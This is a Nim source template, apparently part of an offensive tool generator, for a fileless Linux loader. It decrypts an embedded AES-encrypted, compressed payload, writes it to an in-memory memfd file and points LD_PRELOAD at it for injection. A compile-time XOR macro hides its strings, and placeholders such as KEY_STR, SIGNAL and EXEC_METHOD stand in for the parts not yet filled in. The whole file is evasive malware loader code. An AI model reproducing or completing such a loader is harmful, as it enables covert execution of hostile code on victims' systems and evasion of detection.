import syscall, std/os, std/osproc
import std/strformat
import std/strtabs
from posix_utils import sendSignal

import nimcrypto
import zippy



import macros, hashes
type
    estring = distinct string

proc xorandshift(s: estring, key: int): string {.noinline.} =
    var k = key
    result = string(s)
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
    k = k +% 1

var eCtr {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFFF

macro obf*(s: untyped): untyped =
    if len($s) < 10000:
        var encodedStr = xorandshift(estring($s), eCtr)
        result = quote do:
            xorandshift(estring(`encodedStr`), `eCtr`)
        eCtr = (eCtr *% 16777619) and 0x7FFFFFFF
    else:
        result = s

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc runmain() {.noconv.} =
  #[ FORKS ]#
  var dctx: CTR[aes128]
  #[ KEY_STR ]#
  #[ IV_STR ]#

  const sodata: string = slurp("data.blob")
  var aesdata = uncompress(sodata)
  var mycode = newSeq[byte](aesdata.len)

    
  dctx.init(aeskey, aesiv)
  dctx.decrypt(aesdata.toOpenArrayByte(0, aesdata.high), mycode)


  var memfd_name: cstring = "%MEMFDNAME%"


  var sofd = syscall(MEMFD_CREATE, addr memfd_name[0], 1, 0)
  var pid = os.getCurrentProcessId()
  var memfd_path = fmt(obf("/proc/{pid}/fd/{sofd}"))

  echo memfd_path

  writeFile(memfd_path, toString(mycode))

  var dataenv = newStringTable()
  dataenv["LD_PRELOAD"] = memfd_path

  #[ SIGNAL ]#
  #[ FOREVER ]#


EXEC_METHOD